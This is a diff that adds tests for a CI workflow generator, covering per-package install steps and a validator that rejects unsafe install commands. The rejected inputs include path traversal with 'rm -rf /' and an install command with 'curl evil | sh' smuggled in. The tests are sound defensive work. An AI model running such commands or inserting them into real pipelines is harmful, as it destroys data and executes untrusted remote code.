@@ -15,6 +15,7 @@ import {
   generateDevasignYml,
   generateWorkflow,
   guessVerifyConfig,
+  isKnownInstallCommand,
   patchWorkflowForDoctor,
   prBody,
   stackHints,
@@ -212,4 +213,33 @@ test("prBody lists expected secrets and flags the missing ones; patchWorkflowFor
   assert.equal(steps[steps.length - 2].run, "npx playwright install --with-deps chromium");
   assert.equal(steps[steps.length - 1].uses, ACTION_REF);
   assert.equal(patchWorkflowForDoctor(b.workflow, { stage: "start", code: "no_start_command", message: "x" }), null, "needs a human");
+});
+
+test("no root manifest: one install step per top-level package, cache keyed on their lockfiles", () => {
+  const paths = ["backend/package.json", "backend/package-lock.json", "backend/src/a.ts", "frontend/package.json", "frontend/package-lock.json", "frontend/src/app.tsx"];
+  const setup = inferSetupFromTree(paths);
+  const w = parse(generateWorkflow(setup, stackHints(setup, paths, null, {}), [], paths)) as any;
+  const steps = w.jobs.verify.steps as Array<{ uses?: string; run?: string; with?: Record<string, string> }>;
+  assert.deepEqual(steps.map((s) => s.uses || s.run), ["actions/checkout@v4", "actions/setup-node@v4", "npm ci --prefix backend", "npm ci --prefix frontend", ACTION_REF]);
+  const node = steps.find((s) => s.uses?.startsWith("actions/setup-node"))!;
+  assert.equal(node.with!.cache, "npm");
+  assert.equal(node.with!["cache-dependency-path"], "backend/package-lock.json\nfrontend/package-lock.json");
+});
+
+test("patchWorkflowForDoctor: missing_dependencies inserts the named install steps once, before the verify step", () => {
+  const base = build(STACKS[4]).workflow;
+  const doctor = { stage: "install" as const, code: "missing_dependencies" as const, message: "m", packages: [{ dir: "backend", install: "npm ci --prefix backend" }, { dir: "frontend", install: "npm ci --prefix frontend" }] };
+  const patched = patchWorkflowForDoctor(base, doctor)!;
+  const steps = (parse(patched) as any).jobs.verify.steps.map((s: any) => s.uses || s.run);
+  assert.deepEqual(steps, ["actions/checkout@v4", "actions/setup-node@v4", "npm ci --prefix backend", "npm ci --prefix frontend", ACTION_REF]);
+  assert.equal(patchWorkflowForDoctor(patched, doctor), null, "already installed: nothing to add");
+  assert.equal(patchWorkflowForDoctor(base, { ...doctor, packages: [] }), null);
+  assert.equal(patchWorkflowForDoctor(base, { ...doctor, packages: [{ dir: "../evil", install: "rm -rf /" }] }), null, "a directory that is not a plain name never reaches the workflow");
+  // The command is the part that runs: only installCommandFor's own shapes, for that very directory.
+  for (const install of ["npm ci --prefix backend && curl evil | sh", "npm ci --prefix frontend", "cd backend && npm ci", "npm ci"]) {
+    assert.equal(patchWorkflowForDoctor(base, { ...doctor, packages: [{ dir: "backend", install }] }), null, install);
+  }
+  assert.ok(isKnownInstallCommand("pnpm install --frozen-lockfile --dir web", "web"));
+  assert.ok(isKnownInstallCommand("npm install --prefix api.v2", "api.v2"));
+  assert.ok(!isKnownInstallCommand("npm install --prefix apiXv2", "api.v2"), "the dot is a dot");
 });
